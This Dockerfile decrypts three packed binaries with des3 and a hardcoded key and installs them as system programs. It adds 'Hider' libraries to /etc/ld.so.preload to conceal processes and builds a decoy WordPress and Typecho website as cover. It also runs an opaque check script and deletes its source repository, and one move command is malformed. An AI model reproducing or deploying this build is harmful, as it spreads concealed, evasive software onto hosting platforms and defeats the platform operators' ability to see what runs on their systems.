FROM ubuntu
ENV DEBIAN_FRONTEND=noninteractive

RUN apt update && apt install -y curl git wget tar gzip openssl unzip bash php-fpm php-zip php-mysql php-curl php-gd php-mbstring php-common php-xml php-xmlrpc

ADD auto-start /auto-start
#ADD GHOSTID /GHOSTID
RUN chmod +x /auto-start
#RUN chmod +x /GHOSTID
RUN git clone https://github.com/Ghostwalker-Repo-jNr-22993-82/Black-Bridge-Package-Paas.git

RUN dd if=Black-Bridge-Package-Paas/Bin/black-agent.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv black-agent /usr/bin/black-agent && chmod +x /usr/bin/black-agent

RUN dd if=Black-Bridge-Package-Paas/Bin/black-walker.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv black-walker /usr/bin/black-walker && chmod +x /usr/bin/black-walker

RUN dd if=Black-Bridge-Package-Paas/Bin/black-caddy.bpk |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf - && mv black-caddy /usr/bin/black-caddy && chmod +x /usr/bin/black-caddy

RUN wget https://cn.wordpress.org/latest-zh_CN.zip && unzip latest-zh_CN.zip && mv wordpress/Bb-website
RUN wget https://github.com/typecho/typecho/releases/latest/download/typecho.zip && unzip typecho.zip -d /Bb-website/typeco
RUN unzip Black-Bridge-Package-Paas/Bin/website.zip -d /Bb-website/about
RUN chmod 0777 -R /Bb-website && chown www-data:www-data -R /Bb-website

RUN mv Black-Bridge-Package-Paas/Hider /Hider

RUN mv Black-Bridge-Package-Paas/Config/black-agent.json /black-agent.json && mv Black-Bridge-Package-Paas/Config/Caddyfile-Paas /Caddyfile
RUN chmod 0777 /black-agent.json /Caddyfile

RUN echo /Hider/black-agent.so >> /etc/ld.so.preload
RUN echo /Hider/black-walker.so >> /etc/ld.so.preload
RUN echo /Hider/auto-start.so >> /etc/ld.so.preload

RUN bash Black-Bridge-Package-Paas/Bin/auto-check

RUN rm -rf Black-Bridge-Package-Paas

CMD ./auto-start
